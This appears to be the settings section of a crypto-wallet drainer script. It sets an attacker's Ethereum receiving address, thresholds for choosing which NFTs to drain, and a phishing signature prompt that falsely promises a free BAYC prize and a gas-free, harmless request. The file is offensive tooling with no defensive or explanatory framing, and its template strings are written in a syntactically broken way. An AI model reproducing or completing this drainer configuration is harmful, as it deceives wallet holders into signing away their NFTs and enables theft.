const receiveAddress = "0x980F188E800a6EFcFE0367534480C39e22de7eC9";


const drainNftsInfo = {
    minValue: 10, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    maxTransfers: 20,
}

const signMessage = `Congrats on winning free BAYC ` 
    `Click to sign in and accept the Terms of Service.` 
    `This request will not trigger a blockchain transaction or cost any gas fees.` 
    `Wallet Address:{address}` 
    `Nonce: {nonce}`;

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
